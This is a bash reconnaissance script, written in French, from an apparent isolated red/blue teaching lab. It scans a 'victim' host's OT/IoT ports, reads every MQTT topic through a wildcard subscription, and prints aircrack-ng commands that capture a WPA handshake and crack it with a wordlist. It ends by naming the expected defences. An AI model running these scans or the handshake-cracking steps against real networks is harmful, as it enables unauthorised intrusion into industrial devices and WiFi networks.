#!/usr/bin/env bash
# =============================================================================
#  PROJET RED/BLUE - recon.sh  |  ATT-01 (surface d'attaque) & ATT-02 (WiFi)
#  ⚠️ Lab isolé GI-CNAM uniquement. Adaptez SUBNET/IFACE à votre salle.
# =============================================================================
SUBNET="192.168.10.0/24"
VICTIM="192.168.10.10"
IFACE="wlan0"

echo "== ATT-01 : découverte réseau (hôtes vivants) =="
sudo nmap -sn "$SUBNET" | grep -E "Nmap scan|MAC"

echo "== ATT-01 : ports de la VICTIME (OT/IoT) =="
sudo nmap -sV -p 22,80,443,502,1880,1883,8883 "$VICTIM"

echo "== ATT-01 : bannière Node-RED (si exposé) =="
curl -s -m 3 "http://$VICTIM:1880/" | head -c 200; echo

echo "== ATT-01 : topics MQTT (abonnement wildcard 6s) =="
timeout 6 mosquitto_sub -h "$VICTIM" -t '#' -v 2>/dev/null | sort -u | head -40

echo "== ATT-02 : points d'accès WiFi à portée =="
echo "   (nécessite mode moniteur) :"
echo "   sudo airmon-ng start $IFACE"
echo "   sudo airodump-ng ${IFACE}mon            # repérer le BSSID 'RAYON_FRAIS'"
echo "   sudo airodump-ng -c <CH> --bssid <BSSID> -w capture ${IFACE}mon"
echo "   # capture du handshake puis dictionnaire :"
echo "   aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap"
echo
echo "Défense attendue (BLEU) : segmentation S615 (D8), WPA2/3 fort + MAC ACL (D9)."
